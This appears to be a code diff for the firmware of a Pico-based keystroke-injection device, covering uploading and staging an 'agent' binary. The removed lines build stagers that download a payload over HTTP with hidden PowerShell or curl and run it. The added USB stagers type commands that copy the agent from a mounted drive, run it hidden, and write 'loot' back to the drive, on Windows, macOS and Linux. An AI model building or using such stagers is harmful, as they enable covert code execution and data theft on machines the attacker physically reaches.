@@ -1,16 +1,21 @@
 import gc
 import os
 
-from usb_agent_drive import AGENT_VOLUME_LABEL, usb_agent_filename
-
-from ._http import (
-    _FILE_CHUNK_SIZE,
-    _MAX_BINARY_SIZE,
-    _PAYLOAD_BIN,
-    _STATIC_DIR,
+from usb import (
+    USB_AGENT_UNIX_NAME,
+    USB_AGENT_WINDOWS_NAME,
+    staged_binary_matches_target,
+    staged_binary_name,
+    staged_binary_path,
+    usb_agent_filename,
 )
 
+from ._http import _FILE_CHUNK_SIZE, _MAX_BINARY_SIZE
+
 _ALLOWED_BINARY_EXTENSIONS = {'bin', 'elf', 'exe', 'appimage'}
+_PAYLOAD_BIN = USB_AGENT_UNIX_NAME
+_PAYLOAD_EXE = USB_AGENT_WINDOWS_NAME
+_STAGED_UPLOAD_TEMP = 'payload.upload'
 _USB_LOOT_FILE = 'loot-usb.json'
 _MACH_O_MAGICS = (
     b'\xfe\xed\xfa\xce',
@@ -42,36 +47,41 @@ def _is_supported_upload_name(name: str) -> bool:
     return extension in _ALLOWED_BINARY_EXTENSIONS
 
 
-def _looks_like_executable_binary(prefix: bytes) -> bool:
+def _binary_kind(prefix: bytes) -> str:
     if prefix.startswith(b'MZ'):
-        return True
+        return 'windows'
     if prefix.startswith(b'\x7fELF'):
-        return True
-    return prefix[:4] in _MACH_O_MAGICS
+        return 'unix'
+    if prefix[:4] in _MACH_O_MAGICS:
+        return 'unix'
+    return ''
+
+
+def _looks_like_executable_binary(prefix: bytes) -> bool:
+    return bool(_binary_kind(prefix))
+
+
+def _binary_target_path(kind: str) -> str:
+    return _PAYLOAD_EXE if kind == 'windows' else _PAYLOAD_BIN
+
+
+def _clear_staged_binaries(*, keep: str = '') -> None:
+    for candidate in (_PAYLOAD_EXE, _PAYLOAD_BIN, _STAGED_UPLOAD_TEMP):
+        if candidate == keep:
+            continue
+        try:
+            os.remove(candidate)
+        except OSError:
+            pass
 
 
 class _BinaryMixin:
-    # Attributes provided by SetupServer.__init__
-    _ap_ip: str
-
     # Methods provided by SetupServer / other mixins
     def _is_authorized(self, request) -> bool: ...
     async def _send_json(self, writer, request, status: str, data: dict[str, object]) -> None: ...
-    async def _send_headers(self, writer, request, status: str, headers=None) -> None: ...
-
-    def _ensure_static_dir(self) -> None:
-        try:
-            os.mkdir(_STATIC_DIR)
-        except OSError as exc:
-            if exc.args[0] != 17:  # EEXIST
-                raise
 
     def _has_binary(self) -> bool:
-        try:
-            os.stat(_PAYLOAD_BIN)
-            return True
-        except OSError:
-            return False
+        return bool(staged_binary_path())
 
     async def _discard_request_body(self, reader, remaining: int) -> None:
         while remaining > 0:
@@ -80,38 +90,16 @@ class _BinaryMixin:
                 break
             remaining -= len(chunk)
 
-    def _network_stager_script(self, target_os: str) -> str:
-        url = 'http://' + self._ap_ip + '/static/payload.bin'
-        if target_os == 'windows':
-            cmd = (
-                'powershell -w hidden -c "$p=Join-Path $env:TEMP '
-                + "'pico_agent.exe'; iwr "
-                + url
-                + ' -OutFile $p; & $p; Remove-Item $p -Force -ErrorAction SilentlyContinue"'
-            )
-            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
-        curl_cmd = (
-            'curl -s '
-            + url
-            + ' -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent; '
-            + 'rm -f /tmp/pico_agent'
-        )
-        if target_os == 'macos':
-            return (
-                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
-                'DELAY 600\nSTRING ' + curl_cmd + '\nENTER'
-            )
-        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + curl_cmd + '\nENTER'
-
     def _usb_drive_stager_script(self, target_os: str) -> str:
         agent_name = usb_agent_filename(target_os)
         if target_os == 'windows':
             cmd = (
-                'powershell -w hidden -c "$v=Get-Volume -FileSystemLabel '
-                + AGENT_VOLUME_LABEL
-                + " -ErrorAction SilentlyContinue; if($v){$s=$v.DriveLetter + ':/"
+                'powershell -w hidden -c "$r=(Get-PSDrive -PSProvider FileSystem | % Root | '
+                "?{Test-Path ($_ + '"
                 + agent_name
-                + "'; $loot=$v.DriveLetter + ':/"
+                + "')} | select -First 1); if($r){$s=$r + '"
+                + agent_name
+                + "'; $loot=$r + '"
                 + _USB_LOOT_FILE
                 + "'; $exe=Join-Path $env:TEMP 'pico_agent.exe'; "
                 + 'Copy-Item $s $exe -Force; & $exe --loot-out $loot; '
@@ -121,16 +109,14 @@ class _BinaryMixin:
 
         if target_os == 'macos':
             cmd = (
-                'cp /Volumes/'
-                + AGENT_VOLUME_LABEL
-                + '/'
+                'for d in /Volumes/*; do [ -f "$d/'
                 + agent_name
-                + ' /tmp/pico_agent && chmod +x /tmp/pico_agent && '
-                + '/tmp/pico_agent --loot-out /Volumes/'
-                + AGENT_VOLUME_LABEL
-                + '/'
+                + '" ] && cp "$d/'
+                + agent_name
+                + '" /tmp/pico_agent && chmod +x /tmp/pico_agent && '
+                + '/tmp/pico_agent --loot-out "$d/'
                 + _USB_LOOT_FILE
-                + '; rm -f /tmp/pico_agent'
+                + '" ; rm -f /tmp/pico_agent; break; done'
             )
             return (
                 'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
@@ -138,11 +124,7 @@ class _BinaryMixin:
             )
 
         cmd = (
-            'for d in /media/$USER/'
-            + AGENT_VOLUME_LABEL
-            + ' /run/media/$USER/'
-            + AGENT_VOLUME_LABEL
-            + '; do [ -f "$d/'
+            'for d in /media/$USER/* /run/media/$USER/* /mnt/*; do [ -f "$d/'
             + agent_name
             + '" ] && cp "$d/'
             + agent_name
@@ -153,10 +135,8 @@ class _BinaryMixin:
         )
         return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + cmd + '\nENTER'
 
-    def _stager_script(self, target_os: str, delivery: str = 'network') -> str:
-        if delivery == 'usb_drive':
-            return self._usb_drive_stager_script(target_os)
-        return self._network_stager_script(target_os)
+    def _stager_script(self, target_os: str) -> str:
+        return self._usb_drive_stager_script(target_os)
 
     async def _handle_binary_upload_stream(
         self, reader, writer, partial, content_length: int
@@ -194,7 +174,7 @@ class _BinaryMixin:
                 partial,
                 '413 Content Too Large',
                 {
-                    'message': (f'Binary too large (max {_MAX_BINARY_SIZE // (1024 * 1024)} MB).'),
+                    'message': f'Binary too large (max {_MAX_BINARY_SIZE // (1024 * 1024)} MB).',
                     'notice': 'error',
                 },
             )
@@ -203,9 +183,9 @@ class _BinaryMixin:
         written = 0
         prefix = b''
         try:
-            self._ensure_static_dir()
             gc.collect()
-            with open(_PAYLOAD_BIN, 'wb') as f:
+            _clear_staged_binaries(keep=_STAGED_UPLOAD_TEMP)
+            with open(_STAGED_UPLOAD_TEMP, 'wb') as f:
                 remaining = content_length
                 while remaining > 0:
                     chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
@@ -217,6 +197,7 @@ class _BinaryMixin:
                     written += len(chunk)
                     remaining -= len(chunk)
         except (OSError, MemoryError):
+            _clear_staged_binaries()
             await self._send_json(
                 writer,
                 partial,
@@ -225,17 +206,36 @@ class _BinaryMixin:
             )
             return
 
-        if not _looks_like_executable_binary(prefix):
-            try:
-                os.remove(_PAYLOAD_BIN)
-            except OSError:
-                pass
+        kind = _binary_kind(prefix)
+        if not kind:
+            _clear_staged_binaries()
             await self._send_json(
                 writer,
                 partial,
                 '400 Bad Request',
                 {
                     'message': 'Only executable EXE, ELF, or Mach-O binaries can be uploaded.',
+                    'notice': 'error',
+                },
+            )
+            return
+
+        target_path = _binary_target_path(kind)
+        try:
+            try:
+                os.remove(target_path)
+            except OSError:
+                pass
+            os.rename(_STAGED_UPLOAD_TEMP, target_path)
+            _clear_staged_binaries(keep=target_path)
+        except OSError:
+            _clear_staged_binaries()
+            await self._send_json(
+                writer,
+                partial,
+                '500 Internal Server Error',
+                {
+                    'message': 'Binary staging failed while finalizing the USB payload file.',
                     'notice': 'error',
                 },
             )
@@ -249,36 +249,17 @@ class _BinaryMixin:
                 'message': f'Binary uploaded ({written} bytes).',
                 'notice': 'success',
                 'size': written,
-                'filename': fname,
+                'filename': os.path.basename(target_path),
             },
         )
 
-    async def _serve_payload(self, writer, request) -> None:
-        try:
-            fstat = os.stat(_PAYLOAD_BIN)
-            file_size = fstat[6]
-        except OSError:
-            await self._send_json(
-                writer, request, '404 Not Found', {'message': 'No payload staged.'}
-            )
-            return
-        await self._send_headers(
-            writer,
-            request,
-            '200 OK',
-            headers={
-                'Content-Type': 'application/octet-stream',
-                'Content-Disposition': 'attachment; filename="payload.bin"',
-                'Content-Length': str(file_size),
-            },
-        )
-        try:
-            with open(_PAYLOAD_BIN, 'rb') as fh:
-                while True:
-                    chunk = fh.read(_FILE_CHUNK_SIZE)
-                    if not chunk:
-                        break
-                    writer.write(chunk)
-                    await writer.drain()
-        except OSError:
-            pass
+    def _binary_target_notice(self, target_os: str) -> str:
+        if target_os == 'windows':
+            return 'Upload a Windows PE binary before injecting into Windows targets.'
+        return 'Upload a Linux or macOS ELF/Mach-O binary before injecting into this target.'
+
+    def _binary_matches_target(self, target_os: str) -> bool:
+        return staged_binary_matches_target(target_os)
+
+    def _staged_binary_name(self) -> str:
+        return staged_binary_name()
